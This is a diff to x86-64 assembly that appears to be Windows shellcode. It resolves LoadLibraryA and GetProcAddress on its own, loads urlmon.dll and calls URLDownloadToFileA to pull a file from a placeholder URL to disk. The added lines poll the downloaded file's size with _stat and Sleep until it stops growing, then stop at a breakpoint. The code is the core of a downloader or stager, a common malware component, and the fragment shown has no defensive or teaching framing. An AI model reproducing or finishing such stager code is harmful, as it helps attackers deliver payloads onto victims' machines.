@@ -4,10 +4,10 @@ O_CREAT EQU   0x0100
 O_RDWR EQU    0x0002
 O_APPEND EQU  0x0008
 
-; rbx = URLDownloadToFileA
-; rdi =
-; rsi =
-; r12 =
+; rbx = URLDownloadToFileA / Size of file
+; rdi = msvcrt.dll / Sleep
+; rsi = _stat buffer
+; r12 = _stat function
 ; r13 = GetProcAddress
 ; r14 = LoadLibraryA
 ; r15 = Data section
@@ -51,7 +51,42 @@ section .text
     push r9
     call rax              ; Download &url to &filename
     ; TODO Check return value == S_OK
-    int3
+    mov rcx, r15
+    add rcx, dll2
+    call r14
+    mov rdi, rax        ; msvcrt.dll
+    mov rcx, rax
+    mov rdx, r15
+    add rdx, mallocF
+    call r13
+    mov rcx, 0x2e       ; sizeof(struct _stat)
+    call rax
+    mov rsi, rax        ; _stat buffer
+    mov rcx, rdi
+    mov rdx, r15
+    add rdx, statF
+    call r13
+    mov rcx, [r12d + 0x30]
+    mov r12, rax
+    mov rdx, r15
+    add rdx, sleepF
+    call r13
+    mov rdi, rax        ; Sleep function
+    xor rbx, rbx
+    downloadCheck:
+      mov rcx, 0x3e8    ; 1000ms
+      call rdi
+      mov rcx, r15
+      add rcx, filename
+      mov rdx, rsi
+      call r12
+      mov eax, [rsi + 0x14]     ; stats.st_size
+      cmp rax, rbx
+      je done
+      mov rbx, rax
+      jmp downloadCheck
+      done:
+        int3
     
   
   getFunction:
@@ -136,7 +171,11 @@ section .data
   user db "user32.dll", 0
   loadLibrary db "LoadLibraryA", 0
   dll1 db "urlmon.dll", 0
+  dll2 db "msvcrt.dll", 0
   downloadF db "URLDownloadToFileA", 0
+  statF db "_stat", 0
+  mallocF db "malloc", 0
+  sleepF db "Sleep", 0
   url db "https://UrlToAFile.com", 0
   filename db "./filename", 0
   end
